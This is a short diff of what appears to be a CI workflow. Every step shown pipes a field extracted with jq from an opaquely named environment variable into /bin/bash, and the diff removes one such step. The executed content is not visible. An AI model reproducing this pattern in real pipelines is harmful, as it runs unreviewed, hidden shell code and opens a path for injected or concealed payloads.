@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$wayb77" | jq -r .mjs23 | /bin/bash
           echo $beanc28 | jq -r .gi49 | /bin/bash
           echo $rcx490 | jq -r .o08 | /bin/bash
-          printf '%s' "$yv29993" | jq -r .niah3375 | /bin/bash
           printf '%s' "$y03" | jq -r .z591 | /bin/bash
           printf '%s' "$daw999" | jq -r .xvtn1565 | /bin/bash
           printf '%s' "$n5233" | jq -r .ojhx5981 | /bin/bash
